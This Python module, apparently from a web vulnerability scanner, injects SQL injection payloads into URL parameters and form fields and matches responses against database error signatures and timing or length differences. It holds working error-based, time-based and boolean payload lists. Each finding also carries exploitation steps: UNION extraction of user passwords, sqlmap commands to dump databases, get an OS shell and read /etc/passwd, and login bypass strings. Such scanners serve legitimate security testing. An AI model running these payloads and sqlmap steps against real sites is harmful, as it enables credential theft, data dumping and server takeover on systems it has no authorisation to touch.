import re
import time
from core.utils import make_request, inject_payload_in_url, print_finding, print_status

MODULE = "SQLi"

ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"microsoft ole db provider for sql server",
    r"microsoft ole db provider for odbc drivers",
    r"microsoft sql native client error",
    r"pg_query\(\).*failed",
    r"pg_exec\(\).*failed",
    r"valid postgresql result",
    r"psqlexception",
    r"org\.postgresql\.util\.psqlexception",
    r"sqlite3\.operationalerror",
    r"sqlite\.exception",
    r"sqlite error",
    r"oracle.*driver.*error",
    r"ora-\d{5}",
    r"db2 sql error",
    r"sql command not properly ended",
    r"dynamic sql error",
    r"sybase message",
    r"ingres sqlstate",
    r"jdbc\..*exception",
    r"javax\.persistence\.persistenceexception",
    r"hibernate.*exception",
    r"sql syntax.*error",
    r"unterminated.*string",
    r"unknown column",
    r"division by zero",
    r"supplied argument is not a valid",
    r"on mysql result index",
    # Additional signatures for better coverage
    r"mysql_fetch_array\(\)",
    r"mysql_num_rows\(\)",
    r"mysql_fetch_assoc\(\)",
    r"mysql_connect\(\)",
    r"sql server.*driver",
    r"odbc.*driver",
    r"odbc sql",
    r"error.*\bsql\b",
    r"\bsyntax error\b.*near",
    r"unexpected end of sql command",
    r"warning.*pg_",
    r"invalid query",
    r"sql error nr",
    r"incorrect syntax near",
    r"mssql_query\(\)",
    r"num_rows\(\) expects parameter",
    r"mysql error",
    r"sql state",
    r"db_query",
    r"pdo.*exception",
]

PAYLOADS_ERROR = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND 'a'='a",
    "1' AND 'a'='b",
    "admin'--",
]

PAYLOADS_TIME = [
    "' OR SLEEP(3)--",
    "\" OR SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR pg_sleep(3)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
]

BOOLEAN_PAIRS = [
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ("\" OR \"1\"=\"1\"--", "\" OR \"1\"=\"2\"--"),
    ("1 OR 1=1", "1 OR 1=2"),
]


def scan(target_url, crawl_data):
    print_status("Testing for SQL Injection...")
    findings = []

    all_urls = crawl_data.get("urls", [])
    forms = crawl_data.get("forms", [])

    urls_with_params = [u for u in all_urls if "?" in u]

    for url in urls_with_params:
        findings.extend(_test_error_based(url))
        findings.extend(_test_time_based(url))
        findings.extend(_test_boolean_based(url))

    for form in forms:
        findings.extend(_test_form_sqli(form))

    return findings


def _test_error_based(url):
    findings = []
    found_params = set()
    for payload in PAYLOADS_ERROR:
        injected_urls = inject_payload_in_url(url, payload)
        for injected_url, param in injected_urls:
            if param in found_params:
                continue
            resp = make_request(injected_url)
            if resp is None:
                continue

            body = resp.text.lower()
            for pattern in ERROR_SIGNATURES:
                if re.search(pattern, body):
                    finding = {
                        "severity": "CRITICAL",
                        "module": MODULE,
                        "type": "Error-Based SQL Injection",
                        "url": injected_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": pattern,
                        "description": f"SQL error pattern '{pattern}' found when injecting param '{param}'",
                        "exploitation": (
                            f"1. Confirm injection: add a single quote (') to param '{param}' and observe SQL error\n"
                            f"2. Enumerate columns: {url}&{param}=' ORDER BY 1-- (increment until error)\n"
                            f"3. Extract data with UNION: ' UNION SELECT username,password FROM users--\n"
                            f"4. Automate with sqlmap: sqlmap -u '{url}' -p '{param}' --dbs --dump\n"
                            f"5. Get OS shell: sqlmap -u '{url}' -p '{param}' --os-shell\n"
                            f"6. Read files: sqlmap -u '{url}' -p '{param}' --file-read=/etc/passwd"
                        ),
                    }
                    findings.append(finding)
                    found_params.add(param)
                    print_finding("CRITICAL", MODULE,
                                  f"Error-based SQLi in param '{param}'",
                                  url=injected_url,
                                  detail=f"Payload: {payload}")
                    break  # stop checking other patterns for this param+payload
    return findings


def _test_time_based(url):
    findings = []
    found_params = set()
    for payload in PAYLOADS_TIME:
        injected_urls = inject_payload_in_url(url, payload)
        for injected_url, param in injected_urls:
            if param in found_params:
                continue
            start = time.time()
            resp = make_request(injected_url, timeout=15)
            elapsed = time.time() - start

            if resp and elapsed >= 2.5:
                finding = {
                    "severity": "CRITICAL",
                    "module": MODULE,
                    "type": "Time-Based Blind SQL Injection",
                    "url": injected_url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": f"Response delayed by {elapsed:.1f}s",
                    "description": f"Time-based blind SQLi detected  - {elapsed:.1f}s delay in param '{param}'",
                    "exploitation": (
                        f"1. Confirm: inject ' OR SLEEP(5)-- in param '{param}'  - page should delay 5 seconds\n"
                        f"2. Extract data character-by-character using conditional delays:\n"
                        f"   ' OR IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--\n"
                        f"3. Automate: sqlmap -u '{url}' -p '{param}' --technique=T --dbs\n"
                        f"4. Dump tables: sqlmap -u '{url}' -p '{param}' --technique=T --tables -D <dbname>\n"
                        f"5. Dump data: sqlmap -u '{url}' -p '{param}' --technique=T --dump -T users"
                    ),
                }
                findings.append(finding)
                found_params.add(param)
                print_finding("CRITICAL", MODULE,
                              f"Time-based blind SQLi in param '{param}'",
                              url=injected_url,
                              detail=f"Delay: {elapsed:.1f}s | Payload: {payload}")
    return findings


def _test_boolean_based(url):
    findings = []
    found_params = set()
    for true_payload, false_payload in BOOLEAN_PAIRS:
        true_urls = inject_payload_in_url(url, true_payload)
        false_urls = inject_payload_in_url(url, false_payload)

        for (true_url, param), (false_url, _) in zip(true_urls, false_urls):
            if param in found_params:
                continue
            true_resp = make_request(true_url)
            false_resp = make_request(false_url)

            if true_resp is None or false_resp is None:
                continue

            len_diff = abs(len(true_resp.text) - len(false_resp.text))
            max_len = max(len(true_resp.text), len(false_resp.text), 1)
            len_ratio = len_diff / max_len
            # Significant difference: >200 bytes absolute OR >10% relative change
            if true_resp.status_code == false_resp.status_code and (len_diff > 200 or len_ratio > 0.1):
                finding = {
                    "severity": "HIGH",
                    "module": MODULE,
                    "type": "Boolean-Based Blind SQL Injection",
                    "url": url,
                    "parameter": param,
                    "payload": f"TRUE: {true_payload} | FALSE: {false_payload}",
                    "evidence": f"Response length diff: {len_diff} bytes ({len_ratio*100:.1f}%)",
                    "description": f"Boolean-based blind SQLi suspected in param '{param}'",
                    "exploitation": (
                        f"1. TRUE condition ({true_payload}) returns different page than FALSE ({false_payload})\n"
                        f"2. Extract data by asking yes/no questions:\n"
                        f"   ' OR (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--\n"
                        f"3. Compare response sizes to determine if character matches\n"
                        f"4. Automate: sqlmap -u '{url}' -p '{param}' --technique=B --dbs --dump\n"
                        f"5. This can extract entire database contents character-by-character"
                    ),
                }
                findings.append(finding)
                found_params.add(param)
                print_finding("HIGH", MODULE,
                              f"Boolean-based blind SQLi in param '{param}'",
                              url=url,
                              detail=f"Response diff: {len_diff} bytes ({len_ratio*100:.1f}%)")
    return findings


def _test_form_sqli(form):
    findings = []
    found_fields = set()
    action = form["action"]
    method = form["method"]
    inputs = form["inputs"]

    for payload in PAYLOADS_ERROR[:8]:
        for target_input in inputs:
            if target_input["type"] in ("hidden", "submit", "button", "image"):
                continue
            if target_input["name"] in found_fields:
                continue

            data = {}
            for inp in inputs:
                if inp["name"] == target_input["name"]:
                    data[inp["name"]] = payload
                else:
                    data[inp["name"]] = inp["value"] or "test"

            resp = make_request(action, method=method, data=data)
            if resp is None:
                continue

            body = resp.text.lower()
            for pattern in ERROR_SIGNATURES:
                if re.search(pattern, body):
                    finding = {
                        "severity": "CRITICAL",
                        "module": MODULE,
                        "type": "Form-Based SQL Injection",
                        "url": action,
                        "parameter": target_input["name"],
                        "payload": payload,
                        "evidence": pattern,
                        "description": f"SQL error in form field '{target_input['name']}' at {action}",
                        "exploitation": (
                            f"1. Enter a single quote (') in the '{target_input['name']}' form field\n"
                            f"2. If login form, try: admin' OR '1'='1'-- in username field (bypasses auth)\n"
                            f"3. Use sqlmap on the form: sqlmap -u '{action}' --data='{target_input['name']}=test' --dbs\n"
                            f"4. Dump credentials: sqlmap -u '{action}' --data='{target_input['name']}=test' --dump -T users\n"
                            f"5. For login bypass: ' OR 1=1-- as username, anything as password"
                        ),
                    }
                    findings.append(finding)
                    found_fields.add(target_input["name"])
                    print_finding("CRITICAL", MODULE,
                                  f"Form SQLi in field '{target_input['name']}'",
                                  url=action,
                                  detail=f"Payload: {payload}")
                    break  # stop checking other patterns for this field+payload
    return findings
